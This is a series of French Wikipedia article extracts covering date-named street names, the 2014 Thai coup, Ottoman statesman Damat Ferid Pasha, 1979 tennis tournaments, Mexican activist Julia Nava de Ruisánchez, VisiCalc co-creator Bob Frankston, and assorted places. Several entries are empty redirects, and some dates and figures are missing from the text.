En France,
Voir aussi les odonymes contenant le nom du mois, sans quantième, dans la page : 
Graphies en langue étrangère.
De tels odonymes de pays non francophones contiennent cette date en d'autres langues, par exemple :
Références et localisations.
Géolocalisations.
L'éventuelle mention « non localisée » signifie que l'odonyme concerné a été repéré dans une liste de voies, mais n'est pas encore enregistré dans les sources principales de géolocalisation utilisées dans cet article : Google Maps, Google Street, ViaMichelin, Géoportail (France), "Géoportail (Belgique)", Bing cartes, Here WeGo, Mappy et OpenStreetMap.

</doc>
<doc id="8979916" url="https://fr.wikipedia.org/wiki?curid=8979916" title="Sept-Avril">
Sept-Avril

Sept-Avril ou VII-Avril ou 7-Avril, avec ou sans majuscule et parfois sans trait d'union, peut désigner :
Calendrier.
7 avril, jour de l'année du calendrier grégorien, ou en cas d'année bissextile.
Édifice.
"Lycée ", à Menzel Temime, délégation de Menzel Temime, gouvernorat de Nabeul, Tunisie.
Odonyme.
Les noms de voies ou places peuvent contenir cette date, sous diverses graphies, en référence à des événements survenus à cette même date.
Graphies en français.
En Tunisie, le : Retour d'Habib Bourguiba à Tunis après son incarcération en France puis son séjour en Italie.
Voir aussi les odonymes contenant le nom du mois, sans quantième, dans la page 
Graphies en langue étrangère.
De tels odonymes de pays non francophones contiennent cette date en d'autres langues, comme :
Références et localisations.
Géolocalisations.
L'éventuelle mention « non localisée » signifie que l'odonyme concerné a été repéré dans une liste de voies, mais n'est pas encore enregistré dans les sources principales de géolocalisation utilisées dans cet article : Google Maps, Google Street, ViaMichelin, Géoportail (France), "Géoportail (Belgique)", Bing cartes, Here WeGo, Mappy et OpenStreetMap.

</doc>
<doc id="8979917" url="https://fr.wikipedia.org/wiki?curid=8979917" title="Huit-Avril">
Huit-Avril

Huit-Avril ou VIII-Avril ou 8-Avril, avec ou sans majuscule et parfois sans trait d'union, peut désigner :
Calendrier.
8 avril, jour de l'année du calendrier grégorien, ou en cas d'année bissextile.
Odonyme.
Les noms de voies ou places peuvent contenir cette date, sous diverses graphies, en référence à des événements survenus à cette même date. Cependant aucun odonyme de ce type, en français, n'a été recensé jusqu'à début 2018.
Graphies en français.
En France, le : La fusion des 4 anciennes communes de Vierzon-Bourgneuf, Vierzon-Forges, Vierzon-Villages et Vierzon-Ville, donne naissance à Vierzon, dans le Cher.
Voir aussi les odonymes contenant le nom du mois, sans quantième, dans la page : 
Graphies en langue étrangère.
De tels odonymes de pays non francophones contiennent cette date en d'autres langues, notamment :
Références et localisations.
Géolocalisations.
L'éventuelle mention « non localisée » signifie que l'odonyme concerné a été repéré dans une liste de voies, mais n'est pas encore enregistré dans les sources principales de géolocalisation utilisées dans cet article : Google Maps, Google Street, ViaMichelin, Géoportail (France), "Géoportail (Belgique)", Bing cartes, Here WeGo, Mappy et OpenStreetMap.

</doc>
<doc id="8979918" url="https://fr.wikipedia.org/wiki?curid=8979918" title="Ansermet">
Ansermet



</doc>
<doc id="8979919" url="https://fr.wikipedia.org/wiki?curid=8979919" title="Blarer">
Blarer



</doc>
<doc id="8979921" url="https://fr.wikipedia.org/wiki?curid=8979921" title="Cantoni (famille)">
Cantoni (famille)



</doc>
<doc id="8979923" url="https://fr.wikipedia.org/wiki?curid=8979923" title="Vingt-Deux-Avril">
Vingt-Deux-Avril

Vingt-Deux-Avril ou XXII-Avril ou 22-Avril, avec ou sans majuscule et parfois sans trait d'union, peut désigner :
Calendrier.
22 avril, jour de l'année du calendrier grégorien, ou en cas d'année bissextile.
Odonyme.
Les noms de voies ou places contiennent cette date, sous diverses graphies, en référence à des événements survenus à cette même date.
Graphies en français.
En France,
Voir aussi les odonymes contenant le nom du mois, sans quantième, dans la page : 
Graphies en langue étrangère.
De tels odonymes de pays non francophones contiennent cette date en d'autres langues, notamment :
Références et localisations.
Géolocalisations.
L'éventuelle mention « non localisé(e) » signifie que l'odonyme concerné a été repéré dans une liste de voies, mais n'est pas encore connu des sources principales de géolocalisation utilisées dans cet article : Google Maps, Google Street View, ViaMichelin, Géoportail, Bing cartes, Here WeGo, Mappy et OpenStreetMap.

</doc>
<doc id="8979926" url="https://fr.wikipedia.org/wiki?curid=8979926" title="Vingt-Trois-Avril">
Vingt-Trois-Avril

Vingt-Trois-Avril ou XXIII-Avril ou 23-Avril, avec ou sans majuscule et parfois sans trait d'union, peut désigner :
Calendrier.
23 avril, jour de l'année du calendrier grégorien, ou en cas d'année bissextile.
Odonyme.
Les noms de plusieurs voies ou places contiennent cette date sous diverses graphies, en référence à des événements survenus à cette même date.
Graphies en français.
Au Québec (Canada), le : 
Voir aussi les odonymes contenant le nom du mois, sans quantième, dans la page : 
Graphies en langue étrangère.
De tels odonymes de pays non francophones contiennent cette date en d'autres langues, notamment :
Références et localisations.
Géolocalisations.
L'éventuelle mention « non localisé(e) » signifie que l'odonyme concerné a été repéré dans une liste de voies, mais n'est pas encore connu des sources principales de géolocalisation utilisées dans cet article : Google Maps, Google Street View, ViaMichelin, Géoportail, Bing cartes, Here WeGo, Mappy et OpenStreetMap.

</doc>
<doc id="8979929" url="https://fr.wikipedia.org/wiki?curid=8979929" title="Vingt-Six-Avril">
Vingt-Six-Avril

Vingt-Six-Avril ou XXVI-Avril ou 26-Avril, avec ou sans majuscule et parfois sans trait d'union, peut désigner :
Calendrier.
26 avril, jour de l'année du calendrier grégorien, ou en cas d'année bissextile.
Odonyme.
Les noms de voies ou places peuvent contenir cette date sous diverses graphies, en référence à des événements survenus à cette même date. Cependant, aucun odonyme en français n'a encore été recensé.
Graphies en français.
Voir aussi les odonymes contenant le nom du mois, sans quantième, dans la page : 
Graphies en langue étrangère.
De tels odonymes de pays non francophones contiennent cette date en d'autres langues, notamment :
Références et localisations.
Géolocalisations.
L'éventuelle mention « non localisé(e) » signifie que l'odonyme concerné a été repéré dans une liste de voies, mais n'est pas encore connu des sources principales de géolocalisation utilisées dans cet article : Google Maps, Google Street View, ViaMichelin, Géoportail, Bing cartes, Here WeGo, Mappy et OpenStreetMap.

</doc>
<doc id="8979931" url="https://fr.wikipedia.org/wiki?curid=8979931" title="Hoffmann-Oeri">
Hoffmann-Oeri



</doc>
<doc id="8979935" url="https://fr.wikipedia.org/wiki?curid=8979935" title="Vergnaud">
Vergnaud



</doc>
<doc id="8979936" url="https://fr.wikipedia.org/wiki?curid=8979936" title="Bautzmann von Rabenau">
Bautzmann von Rabenau



</doc>
<doc id="8979937" url="https://fr.wikipedia.org/wiki?curid=8979937" title="Casparini">
Casparini



</doc>
<doc id="8979939" url="https://fr.wikipedia.org/wiki?curid=8979939" title="Coup d'État de 2014 en Thaïlande">
Coup d'État de 2014 en Thaïlande

Le coup d'État de 2014 en Thaïlande est un putsch déclenché par Prayuth Chan-ocha, commandant en chef de l'Armée royale thaïlandaise. Le , alors que le pays traverse une crise politique depuis plusieurs mois, la junte militaire renverse le gouvernement provisoire dirigé par le Premier ministre par intérim Niwatthamrong Boonsongpaisan. Celui-ci a remplacé Yingluck Shinawatra, destituée le par la Cour constitutionnelle de Thaïlande.
Contexte.
Yingluck Shinawatra, tête de liste du parti Pheu Thai, remporte les élections législatives de 2011 et est nommée premier ministre de Thaïlande. Elle est la sœur de l'ancien premier ministre Thaksin Shinawatra, renversé par le coup d'État de septembre 2006. Celui-ci, qui a quitté le pays, est condamné par contumace en 2008 pour des malversations financières.
À partir de novembre 2013, la Thaïlande traverse une crise politique provoquée par un projet de loi d'amnistie voté par les députés puis rejeté à l'unanimité par le Sénat. Le départ de Yingluck Shinawatra est réclamé lors de violentes manifestations. Des affrontements opposent les « chemises jaunes » du opposées à Shinawatra et les « chemises rouges » de l'UDD, qui la soutiennent. Ils continuent après la dissolution du Parlement et l'annonce, en décembre 2013, de prochaines élections. Les manifestants du PAD estiment que la première ministre perpétue le « système Thaksin » instauré en son temps par son frère aîné.
Accusée de corruption et d'abus de pouvoir, Yingluck Shinawatra témoigne le devant la Cour constitutionnelle. Elle est reconnue coupable et destituée dès le lendemain. Le ministre du Commerce, Niwattumrong Boonsongpaisan, est nommé premier ministre par intérim. Après l'invalidation des élections de février, un nouveau scrutin est prévu pour le mois de juillet.
Déroulement du putsch.
Le , le général Prayuth Chan-ocha, commandant en chef de l'Armée royale thaïlandaise, instaure la loi martiale. L'armée organise des pourparlers entre représentants des deux factions rivales afin de mettre fin aux troubles, dont le bilan s'élève à .
Le 22, lors d'une annonce télévisée, Prayuth Chan-ocha revendique un coup d'État déclenché « pour que le pays revienne à la normale ». Il suspend la Constitution de la Thaïlande. Une junte, dénommée Conseil national pour la paix et le maintien de l'ordre, prend le contrôle des médias pour assurer la « fiabilité des informations ». Les rassemblements de plus de cinq personnes sont interdits. L'armée déployée dans Bangkok disperse les manifestants soutenant la première ministre, ainsi que ses opposants. Yingluck Shinawatra fait partie des 155 personnalités interdites de sortie de territoire par la junte militaire. Le 24, la junte dissout le Sénat.
Dans un contexte où l'opposition conservatrice, représentée par le Parti démocrate, a été défaite à toutes les élections depuis 2001 (2005, 2006, 2007, 2011 et 2014) par le parti populiste Pheu Thai et son prédécesseur Thai rak Thai, tandis que le gouvernement renversé bénéficie du soutien de la majorité de la population, le coup d’État vise notamment à modifier la Constitution pour instaurer un Parlement et un gouvernement dont une grande partie des membres ne seraient plus élus, mais nommés. 
Réactions internationales.
En mai 2014, le putsch est condamné par la communauté internationale. Parmi les responsables appelant à un retour de la démocratie en Thaïlande figurent le secrétaire général de l'ONU Ban Ki-moon, une porte-parole de la représentante de l'Union européenne pour les Affaires étrangères Catherine Ashton et le secrétaire d'État américain John Kerry. Des déclarations allant dans le même sens sont publiées par l'Allemagne, la France et le Royaume-Uni, ainsi que des pays d'Asie comme le Japon et Singapour. Les ministres des Affaires étrangères de Chine et de Russie déclarent espérer une résolution pacifique de la situation en Thaïlande. En Asie, le Cambodge et le Laos sont les deux premiers pays à accueillir des réfugiés politiques thaïlandais.
Suites du coup d'État.
La junte doit faire face à quelques manifestations d'opposants au coup d'État, mais est soutenue par la bourgeoisie de Bangkok. En juillet 2014, le roi Bhumibol Adulyadej, qui règne sous le nom de Rama IX, approuve une constitution provisoire qui octroie de larges pouvoirs aux militaires. Le mois suivant, les de l'Assemblée nationale législative sont directement désignés par la junte. Le général Prayuth Chan-ocha, qui était le seul candidat, est élu au poste de Premier ministre. Un gouvernement provisoire doit diriger le pays jusqu'à la tenue d'élections, prévues pour l'année suivante. La junte militaire souhaite désigner un conseil chargé de mettre en place des réformes constitutionnelles. Un « filtrage » des candidats est envisagé afin de diminuer le poids électoral du Pheu Thai, le parti de Shinawatra, qui remporte régulièrement les élections.
Une nouvelle constitution donnant davantage de pouvoirs à la junte est adoptée en 2016. Elle accorde à l'armée le pouvoir de nommer l’intégralité des membres du Sénat et élargit les possibilités de nomination du Premier ministre, qui ne doit désormais plus être issu du Parlement, facilitant ainsi la nomination d’un militaire.

</doc>
<doc id="8979940" url="https://fr.wikipedia.org/wiki?curid=8979940" title="Jenisch (famille)">
Jenisch (famille)



</doc>
<doc id="8979942" url="https://fr.wikipedia.org/wiki?curid=8979942" title="Damat Ferid Pacha">
Damat Ferid Pacha

Damat Mehmet Adil Ferit, connu comme Damat Ferid Pacha, né en 1853 à Constantinople (Empire ottoman) et mort le à Nice (France), est un homme d'État ottoman. 
Biographie.
Jeunesse et études.
Il étudie à l'École libre des sciences politiques.
Parcours professionnel.
Il occupe par deux fois le poste de grand vizir (du au puis du au ). En tant que grand vizir (premier ministre) il est l'un des signataires ottomans du traité de Sèvres.
Vie personnelle.
En 1886, il épouse la princesse , la fille du sultan ottoman Abdülmecid Ier, et reçoit le titre honorifique de "Damat" (signifiant "Consort" de la dynastie ottomane).

</doc>
<doc id="8979943" url="https://fr.wikipedia.org/wiki?curid=8979943" title="Lotter">
Lotter



</doc>
<doc id="8979946" url="https://fr.wikipedia.org/wiki?curid=8979946" title="Parler (famille)">
Parler (famille)



</doc>
<doc id="8979948" url="https://fr.wikipedia.org/wiki?curid=8979948" title="Schwanthaler">
Schwanthaler



</doc>
<doc id="8979950" url="https://fr.wikipedia.org/wiki?curid=8979950" title="Damat Ferid Paşa">
Damat Ferid Paşa



</doc>
<doc id="8979951" url="https://fr.wikipedia.org/wiki?curid=8979951" title="Tournoi de tennis de Pittsburgh (WTA 1979)">
Tournoi de tennis de Pittsburgh (WTA 1979)

Le tournoi de tennis de Pittsburgh est un tournoi de tennis professionnel féminin. L'édition 1979 se dispute du 10 au .
Sue Barker remporte le simple dames. En finale, elle bat Renée Richards, décrochant à cette occasion le de sa carrière sur le circuit WTA.
L'épreuve de double voit quant à elle s'imposer Sue Barker et Candy Reynolds.

</doc>
<doc id="8979967" url="https://fr.wikipedia.org/wiki?curid=8979967" title="Damat Ferid Pasha">
Damat Ferid Pasha



</doc>
<doc id="8979968" url="https://fr.wikipedia.org/wiki?curid=8979968" title="Sylviane Leto">
Sylviane Leto



</doc>
<doc id="8979974" url="https://fr.wikipedia.org/wiki?curid=8979974" title="Julia Nava de Ruisánchez">
Julia Nava de Ruisánchez

Julia Nava de Ruisánchez connu également sous le nom de Ruiz Sánchez, née le à Galeana dans l'État du Nuevo León et morte le à Mexico, est une écrivaine et militante féminine mexicaine ayant participé à la Révolution mexicaine.
Biographie.
Julia Nava de Ruisánchez a suivi l'école de formation des enseignants de l'État et en 1900, devint directrice de l'école secondaire de Tula située dans l'État de Tamaulipas.
En 1904, elle fonde à Mexico, la "Sociedad Protectora de la Mujer" "(Société protectrice des femmes)", la plus ancienne association féministe du Mexique.
En 1909, elle prend part à l'opposition au président mexicain Porfirio Díaz en rédigeant notamment des articles anti-gouvernementaux dans des journaux d'opposition. 
En 1910, elle co-fonde avec sa compatriote révolutionnaire Dolores Jiménez y Muro le "Club Antirreeleccionista Hijas de Cuauhtémoc" "(Club d'Anti-Réélection des femmes de Cuauhtémoc)". À la suite de plusieurs réunions organisées dans leur maison, son mari finit par être arrêté. 
En 1913, elle continua le combat contre le nouveau président mexicain Victoriano Huerta, notamment en distribuant des tracts imprimés par la révolutionnaire Maria Arias Bernal. Peu après, elle rejoint avec sa camarade Dolores Jiménez y Muro, les forces révolutionnaires d'Emiliano Zapata. Son opposition politique au président Victoriano Huerta déboucha sur son arrestation. 
Après sa libération et la fin de la Révolution mexicaine, elle participa au "Consejo Feminista Mexicano" "(Conseil féministe mexicain)". En 1921, elle édita la revue bimensuelle, "La Mujer y la vida" "(La Femme et la vie)". 
En 1922, elle participe à la délégation féminine, représentant le Mexique, comprenant Elena Torres, Eulalia Guzmán et Luz Vera, lors de la "Feminist Council at the Pan-American Women's Conference" tenue à Baltimore aux États-Unis.
En 1926, elle fonda le premier établissement d'enseignement du Mexique pour le travail social " Escuela de Enseñanza Doméstica". La pédagogie de cette école reçut une reconnaissance officielle gouvernementale que le . Cette reconnaissance a contribué aux femmes mexicaines d'entrer dans la vie active et de s'insérer dans la vie sociale et économique du pays.
Bibliographie.
Julia Nava de Ruisánchez fut une écrivaine de l'Entre-deux-guerres.

</doc>
<doc id="8979975" url="https://fr.wikipedia.org/wiki?curid=8979975" title="Menara ExxonMobil">
Menara ExxonMobil

La Menara ExxonMobil est un gratte-ciel de de hauteur construit en 1998 (selon Skyscraperpage) à Kuala Lumpur, en Malaisie.
Il abrite des bureaux sur 30 étages.
L'architecte est l'agence Kumpulan Senireka Sdn Bhd

</doc>
<doc id="8979991" url="https://fr.wikipedia.org/wiki?curid=8979991" title="Eckau">
Eckau



</doc>
<doc id="8979994" url="https://fr.wikipedia.org/wiki?curid=8979994" title="Toussaint-Noël Loyer">
Toussaint-Noël Loyer

Toussaint-Noël Loyer, né le à Rouen et mort à Lyon le , est un architecte français.
Réalisations.
Il réalise les travaux d'architecture suivants :
Distinction.
Il est membre de l'Académie de Lyon dès 1761.

</doc>
<doc id="8979999" url="https://fr.wikipedia.org/wiki?curid=8979999" title="ElasticSearch">
ElasticSearch



</doc>
<doc id="8980003" url="https://fr.wikipedia.org/wiki?curid=8980003" title="Galeana">
Galeana

Galeana est une ville de l'état du Nuevo León au Mexique.
Description.
La population était de lors du recensement de la population de 2010.
La ville a été fondée en 1678. Elle s'élève à plus de mètres d'altitude au milieu d'une sierra semi-aride.
Personnalité liée à la commune.
La militante féminine Julia Nava de Ruisánchez y est née en 1883.

</doc>
<doc id="8980008" url="https://fr.wikipedia.org/wiki?curid=8980008" title="Bibliothèque de la place Guisan">
Bibliothèque de la place Guisan

La bibliothèque de la place Guisan, ancienne bibliothèque militaire fédérale appelée en allemand , est une bibliothèque publique spécialisée dans le domaine militaire et située dans la ville de Berne, en Suisse.
Histoire.
C'est en 1848 que la Bibliothèque militaire fédérale (BMF) a été fondée sur l'initiative de Guillaume-Henri Dufour avec, comme tâche principale, de collecter . En 1998, la bibliothèque devient le centre d'archives pour le Département fédéral de la défense, de la protection de la population et des sports (DDPS) et l'armée suisse.
Tout d'abord localisée dans l'aile est du Palais fédéral, elle déménage en 2007 dans des locaux précédemment utilisés par l'arsenal de Berne.
Depuis le , la bibliothèque a également pour tâche de coordonner l'activité de l'ensemble des bibliothèques de l'administration fédérale, de diriger la Conférence de documentation de la Confédération ainsi que le réseau de bibliothèques « Alexandria ».
Collections.
Classée comme bien culturel suisse d'importance nationale, la bibliothèque possède plus de et directement ou indirectement liés au domaine militaire. La bibliothèque possède également une collection de cartes postales militaires et une collection d'autographes, toutes deux numérisées et disponibles en consultation sur Internet.

</doc>
<doc id="8980010" url="https://fr.wikipedia.org/wiki?curid=8980010" title="Principe de parité">
Principe de parité



</doc>
<doc id="8980014" url="https://fr.wikipedia.org/wiki?curid=8980014" title="Bibliothèque am Guisanplatz">
Bibliothèque am Guisanplatz



</doc>
<doc id="8980020" url="https://fr.wikipedia.org/wiki?curid=8980020" title="Haruya Yamazaki">
Haruya Yamazaki

, de son nom de naissance Tadashi Yamazaki, est un scénariste japonais né le à Tokyo au Japon et mort en . Il est principalement connu pour être le scénariste des films d'animation "Le Château de Cagliostro", "Cobra" et pour sa participation au scénario des séries d'animation "Albator, le corsaire de l'espace" et "Rémi sans famille".

</doc>
<doc id="8980022" url="https://fr.wikipedia.org/wiki?curid=8980022" title="Bob Frankston">
Bob Frankston

Robert (Bob) Frankston (né le à Brooklyn, New York) est le créateur avec Dan Bricklin du premier tableur grand public VisiCalc. Il est aussi le cofondateur de la société .
Biographie.
Il est diplômé de la Stuyvesant High School de New York en 1966 et du MIT en 1970.
Il conçoit VisiCalc avec Dan Bricklin durant l'hiver 1978-1979. La première version a été commercialisée en octobre 1979. Ce tableur est l'application qui a contribué au succès de l'Apple II.
Il a reçu de nombreuses récompenses durant sa carrière :

</doc>
<doc id="8980033" url="https://fr.wikipedia.org/wiki?curid=8980033" title="Classic du Japon 1979">
Classic du Japon 1979

Le Classic du Japon est un tournoi de tennis professionnel féminin. L'édition 1979, classée en catégorie Colgate Series, se dispute à Kyoto du 15 au .
Betsy Nagelsen remporte le simple dames. En finale, elle bat Naoko Sato, décrochant à cette occasion le de sa carrière sur le circuit WTA.
L'épreuve de double voit quant à elle s'imposer Yu Li-Qiao et Chen Chuan.

</doc>
<doc id="8980034" url="https://fr.wikipedia.org/wiki?curid=8980034" title="Robert Frankston">
Robert Frankston



</doc>
<doc id="8980036" url="https://fr.wikipedia.org/wiki?curid=8980036" title="ÖTTV">
ÖTTV



</doc>
<doc id="8980037" url="https://fr.wikipedia.org/wiki?curid=8980037" title="OTTV">
OTTV



</doc>
<doc id="8980041" url="https://fr.wikipedia.org/wiki?curid=8980041" title="Grand lac Squatec">
Grand lac Squatec

Le Grand lac Squatec est un plan d'eau douce de la municipalité de Lejeune, dans la municipalité régionale de comté (MRC) de Témiscouata, dans la région administrative du Bas-Saint-Laurent, au Québec, au Canada.
Géographie.
Le Grand lac Squatec est situé à:
Le Grand lac Squatec constitue la démarcation entre les municipalités de Dégelis (au sud-ouest du lac) et de Lejeune. La partie Est de la municipalité de Saint-Juste--du-Lac se termine tout près de la rive ouest du lac.
Les bassins versants voisins sont:
Les montagnes autour du Grand lac Squatec sont:
D'une longueur de 12,5 km (sens nord-sud), le Grand lac Squatec reçoit les eaux du:
L'embouchure du lac se déverse par le nord.
Toponymie.
Le toponyme "Grand lac Squatec" a été officialisé le à la Banque des noms de lieux de la Commission de toponymie du Québec.

</doc>
<doc id="8980043" url="https://fr.wikipedia.org/wiki?curid=8980043" title="Lac Squatec">
Lac Squatec



</doc>
<doc id="8980044" url="https://fr.wikipedia.org/wiki?curid=8980044" title="Frankston">
Frankston

Frankston peut faire référence à :

</doc>
<doc id="8980050" url="https://fr.wikipedia.org/wiki?curid=8980050" title="Binde">
Binde



</doc>
<doc id="8980052" url="https://fr.wikipedia.org/wiki?curid=8980052" title="Mont Hyōno">
Mont Hyōno

Le est une montagne culminant à d'altitude à la limite des villages de Yabu dans la préfecture de Hyōgo et Wakasa dans la préfecture de Tottori au Japon. C'est le sommet le plus élevé de la préfecture de Hyōgo. Les autres noms de cette montagne sont Suga-no-sen, Hyō-zan, Hyō-no-yama, Kōri-no-yama. Le mont Hyōno fait partie du parc quasi national de Hyōnosen-Ushiroyama-Nagisan.

</doc>
<doc id="8980053" url="https://fr.wikipedia.org/wiki?curid=8980053" title="Binde (département)">
Binde (département)



</doc>
<doc id="8980061" url="https://fr.wikipedia.org/wiki?curid=8980061" title="Pickett's Charge">
Pickett's Charge



</doc>
<doc id="8980066" url="https://fr.wikipedia.org/wiki?curid=8980066" title="Hof Chur">
Hof Chur

Hof Chur, ou plus simplement Hof est une ancienne commune de Suisse et un quartier de la ville grisonne de Coire, en Suisse.
Histoire.
L'histoire du quartier de Hof, situé sur une colline surplombant la ville, débute en 1514 lorsque l'empereur du Saint-Empire, , l'érigea en fief impérial et le remit à l'évêque de Coire. C'est dans ce quartier que sont alors construits la cathédrale et le château épiscopal de la ville.
Après la réforme protestante, les articles d'Ilanz conclus en 1526 redonnent à la ville de Coire le pouvoir politique sur le Hof, l'évêché y conservant la souveraineté juridique jusqu'en 1803. En 1852, la commune de Hof fut réunie à celle de Coire sur décision du parlement cantonal.

</doc>
<doc id="8980067" url="https://fr.wikipedia.org/wiki?curid=8980067" title="Pumpgun-Ronnie">
Pumpgun-Ronnie



</doc>
<doc id="8980076" url="https://fr.wikipedia.org/wiki?curid=8980076" title="Espace nordique du Grand Coin">
Espace nordique du Grand Coin

L'espace nordique du Grand Coin, ou simplement le Grand Coin, est un domaine nordique du massif de la Vanoise, en Maurienne, située sur les territoires communaux de Montaimont (Saint François Longchamp), Pontamafrey-Montpascal, Montvernier et Le Châtel, dans le département de la Savoie en région Auvergne-Rhône-Alpes, au pied du Grand Coin et au-dessus de la Maurienne.
Géographie.
Localisation.
Le domaine du Grand Coin est situé en grande partie sur le plateau du Chaussy, entre la vallée de la Maurienne à l'ouest et les premiers sommets de la Vanoise à l'est, culminant entre et . Ce plateau constitue un col, le col du Chaussy, situé à et permettant de relier Pontamafrey-Montpascal au sud et Montaimont au nord.
Accès au domaine.
Le domaine est accessible par Montaimont avec la Route départementale 99 au départ de La Chambre et par Pontamafrey-Montpascal avec la Route départementale 77 au départ de Pontamafrey. Dans chacun des cas, l'ascension vers le domaine s'effectue depuis la vallée de la Maurienne. Il demeure toutefois possible d'arriver de Tarentaise en empruntant le col de la Madeleine situé à quelques kilomètres, fermé toutefois en hiver. Les deux routes départementales 77 et 99 sont reliées par la route du col du Chaussy.
Nom du domaine.
Le nom du domaine provient du "Coin Lognan" aussi dénommé "Grand Coin", dans le massif de la Vanoise. Il s'agit d'un sommet de la montagne des Coins, culminant à . Le nom "Lognan" désigne un lieu « loin, au loin ». Le mot "Coin" désigne en ancien français un « sommet ».
Le domaine.
Promotion et positionnement.
Le domaine ne possède actuellement aucun labels.
Hébergement et restauration.
En 2014, la capacité d'accueil des environs du domaine, estimée par l'organisme "Savoie Mont Blanc", est de répartis dans . Les hébergements se répartissent comme suit : et .
Domaine skiable et gestion.
Le domaine du Grand Coin est géré par un syndicat intercommunal, le Syndicat Intercommunal de la zone nordique du Grand Coin, qui rassemble les communes de Montaimont, Le Châtel, Montvernier et Pontamafrey-Montpascal.

</doc>
<doc id="8980085" url="https://fr.wikipedia.org/wiki?curid=8980085" title="Mont Mimuro">
Mont Mimuro

Le est une montagne culminant à d'altitude à la limite des villages de Shisō dans la préfecture de Hyōgo et Wakasa dans la préfecture de Tottori au Japon. C'est la deuxième montagne la plus élevée de la préfecture de Hyōgo après le mont Hyōno.

</doc>
<doc id="8980087" url="https://fr.wikipedia.org/wiki?curid=8980087" title="Charles Lucas (architecte)">
Charles Lucas (architecte)

Charles Lucas, né le à Paris et mort dans cette même ville le , est un architecte et écrivain français.
Biographie.
Charles Lucas entre en 1856 à l'école des beaux-arts de Paris et étudie auprès de Simon-Claude Constant-Dufeux puis à l'école pratique des hautes études. Il crée le cours d'histoire de l’art à l'école Boulle. Il conçoit également les plans de l'école Estienne.
Distinction.
Il est membre de nombreuses sociétés savantes :
Il est également fait chevalier de l'ordre royal d'Espagne et de l'ordre du Christ.

</doc>
<doc id="8980101" url="https://fr.wikipedia.org/wiki?curid=8980101" title="Czepielin">
Czepielin

Czepielin (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'ouest de Mordy (siège de la gmina), au nord-est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 295 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie.

</doc>
<doc id="8980106" url="https://fr.wikipedia.org/wiki?curid=8980106" title="Czepielin-Kolonia">
Czepielin-Kolonia

Czepielin-Kolonia (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 113 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980107" url="https://fr.wikipedia.org/wiki?curid=8980107" title="Mont Osorakan">
Mont Osorakan

Le est une montagne culminant à d'altitude à la limite des villes d'Akitakata dans la préfecture de Hiroshima et Masuda dans la préfecture de Shimane au Japon. Sommet le plus élevé des préfectures de Hiroshima et Shimane, il fait partie du parc quasi national de Nishi-Chugoku Sanchi.

</doc>
<doc id="8980109" url="https://fr.wikipedia.org/wiki?curid=8980109" title="Bolgenach (rivière)">
Bolgenach (rivière)

La est une rivière allemande puis autrichienne d'une longueur de qui coule en Bavière puis au Vorarlberg. Elle est un affluent de la Weißach et donc un sous-affluent du Rhin.

</doc>
<doc id="8980111" url="https://fr.wikipedia.org/wiki?curid=8980111" title="Château épiscopal de Coire">
Château épiscopal de Coire

Le château épiscopal de Coire, appelé en allemand , est un château fort, situé dans le quartier de Hof de la ville grisonne de Coire, en Suisse.
Histoire.
Un premier bâtiment a été construit après 1272, à la suite de l'inauguration de la cathédrale. Il prend son aspect baroque actuel à la suite d'une refonte 
réalisée entre 1732 et 1733 sous la direction de l'évêque Joseph Benedikt von Rost.
Il est bâti autour d'une cour centrale avec de riches décorations en stuc et décoré de quatre pilastres sur sa façade.
Le bâtiment, de même que sa bibliothèque et les archives qui y sont conservées, sont inscrits comme bien culturel d'importance nationale.

</doc>
<doc id="8980113" url="https://fr.wikipedia.org/wiki?curid=8980113" title="Czołomyje">
Czołomyje

Czołomyje (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Mordy (siège de la gmina), au nord-est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 196 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980117" url="https://fr.wikipedia.org/wiki?curid=8980117" title="Doliwo">
Doliwo

Doliwo (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 70 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980122" url="https://fr.wikipedia.org/wiki?curid=8980122" title="Absolut Relax">
Absolut Relax

Absolut Relax est une radio privée allemande.
Le même groupe comprend aussi Absolut Radio et Absolut Hot.
Histoire.
Absolut Relax émet d'abord sur Internet et sur DAB+ en tant que radio filiale d'Absolut Radio. L'émission DAB+ se limite à la Bavière. Le , elle émet aussi sur la région Rhin-Main par l'émetteur de Großer Feldberg et l'Europaturm.
Programme.
La programmation musicale d'Absolut Relax consiste principalement en des titres de pop et de soft rock, interrompue par des bulletins d'informations.

</doc>
<doc id="8980123" url="https://fr.wikipedia.org/wiki?curid=8980123" title="Batterie rapide d’efficience frontale">
Batterie rapide d’efficience frontale



</doc>
<doc id="8980126" url="https://fr.wikipedia.org/wiki?curid=8980126" title="Glaive imparfait">
Glaive imparfait

Glaive imparfait (titre original : "Imperfect Sword") est le troisième roman de la série de science-fiction "Étoiles perdues" de l'écrivain Jack Campbell. Il est paru aux États-Unis en 2014 puis a été traduit en français et publié par les éditions L'Atalante en 2015.
Cette série traite de l'effondrement de l'univers Syndic, et plus particulièrement les efforts des dirigeants du système de Midway pour faire face aux conséquences à l'effondrement de l'autorité centrale.
Elle se déroule en même temps que les événements de la série "Par delà la frontière".

</doc>
